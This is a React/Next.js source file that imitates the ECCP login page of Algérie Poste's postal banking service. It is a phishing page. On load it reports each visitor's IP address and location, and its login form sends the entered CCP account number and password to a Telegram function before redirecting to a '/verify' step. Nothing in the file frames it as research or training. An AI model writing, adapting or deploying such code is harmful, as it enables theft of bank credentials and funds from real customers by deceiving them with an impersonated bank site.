"use client"

import type React from "react"

import { Menu } from "lucide-react"
import Image from "next/image"
import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { sendToTelegram, sendIpNotification } from "./actions"

export default function ECCPLogin() {
  const router = useRouter()
  const [ccp, setCcp] = useState("")
  const [password, setPassword] = useState("")
  const [loading, setLoading] = useState(false)
  const [message, setMessage] = useState("")

  useEffect(() => {
    const notifyPageVisit = async () => {
      try {
        const ipResponse = await fetch("/api/get-ip")
        const ipData = await ipResponse.json()

        await sendIpNotification(ipData.ip, ipData.city, ipData.country_name, ipData.region, ipData.org)
      } catch (error) {
        console.error("Failed to send IP notification:", error)
      }
    }
    notifyPageVisit()
  }, [])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)
    setMessage("")

    try {
      const result = await sendToTelegram(ccp, password)
      if (result.success) {
        setMessage("Connexion en cours...")
        setCcp("")
        setPassword("")
        setTimeout(() => {
          router.push("/verify")
        }, 1000)
      } else {
        setMessage("Erreur lors de la connexion")
      }
    } catch (error) {
      setMessage("Une erreur s'est produite")
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gray-100 font-sans">
      {/* Header */}
      <header className="bg-blue-900 text-white px-6 py-4 flex items-center justify-between">
        <div className="w-16 h-16 flex items-center justify-center">
          <Image src="/logo.png" alt="ECCP Algérie Poste" width={64} height={64} priority />
        </div>
        <button className="text-yellow-400 hover:text-yellow-300">
          <Menu size={32} />
        </button>
      </header>

      {/* Main Content */}
      <main className="max-w-2xl mx-auto px-6 py-12">
        {/* Title Section */}
        <div className="mb-12">
          <h1 className="text-3xl font-bold text-blue-900 mb-2 font-sans">ECCP - ALGÉRIE POSTE</h1>
          <div className="h-1 bg-yellow-400 w-full mb-8"></div>
          <h2 className="text-xl font-semibold text-gray-800 font-sans">CONNECTEZ-VOUS À VOTRE COMPTE</h2>
        </div>

        {/* Login Form Container */}
        <div className="bg-gray-200 border-4 border-blue-900 rounded-3xl p-8 mb-12">
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* CCP Field */}
            <div>
              <label className="block text-gray-800 font-semibold mb-3 font-sans">CCP (Sans la clé)</label>
              <input
                type="text"
                inputMode="numeric"
                value={ccp}
                onChange={(e) => {
                  const numericValue = e.target.value.replace(/[^0-9]/g, "").slice(0, 10)
                  setCcp(numericValue)
                }}
                required
                className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-900 bg-white font-sans"
                placeholder=""
              />
            </div>

            {/* Password Field */}
            <div>
              <label className="block text-gray-800 font-semibold mb-3 font-sans">Mot de passe</label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
                className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-900 bg-white font-sans"
                placeholder=""
              />
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-blue-900 text-white font-bold py-3 px-6 rounded-lg hover:bg-blue-800 transition-colors mt-8 font-sans disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {loading ? "Connexion..." : "Se connecter"}
            </button>

            {message && (
              <div
                className={`text-center font-sans ${message.includes("Erreur") ? "text-red-600" : "text-green-600"}`}
              >
                {message}
              </div>
            )}

            {/* Forgot Password Link */}
            <div className="text-center">
              <a href="#" className="text-blue-900 font-semibold hover:underline font-sans">
                Mot de passe oublié ?
              </a>
            </div>
          </form>
        </div>

        {/* Bottom Section */}
        <div className="text-center space-y-8">
          <div>
            <h3 className="text-2xl font-bold text-blue-900 mb-2 font-sans">Vous n'avez pas de compte ECCP ?</h3>
          </div>

          <button className="bg-blue-900 text-white font-bold py-3 px-8 rounded-lg hover:bg-blue-800 transition-colors font-sans">
            Créer un compte en-ligne
          </button>

          <p className="text-sm text-gray-600 font-sans">Si vous disposez déjà d'une carte EDAHABIA</p>

          <div className="text-2xl font-bold text-blue-900 font-sans">OU</div>

          <p className="text-sm text-gray-700 leading-relaxed max-w-md mx-auto font-sans">
            Vous pouvez obtenir un code confidentiel au niveau de l'établissement postal de votre choix suite à la
            présentation d'une copie d'une pièce d'identité accompagnée du formulaire ci-dessous
          </p>
        </div>
      </main>
    </div>
  )
}
